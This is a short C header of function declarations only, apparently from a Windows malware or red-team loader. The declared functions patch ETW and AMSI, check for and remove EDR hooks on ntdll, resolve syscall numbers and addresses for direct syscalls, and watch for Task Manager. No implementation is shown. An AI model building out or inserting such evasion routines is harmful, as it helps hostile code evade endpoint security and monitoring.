#pragma once

BOOL EtwPatch();
BOOL EdrHookerCheck();
BOOL unhook_Ntdll();
BOOL AmsiPatch();
DWORD getSSN(char* funcName);
extern DWORD g_ssn;
extern PVOID g_syscall;
PVOID getSyscallAddr(char* funcName);
BOOL WatchForTaskmgr();


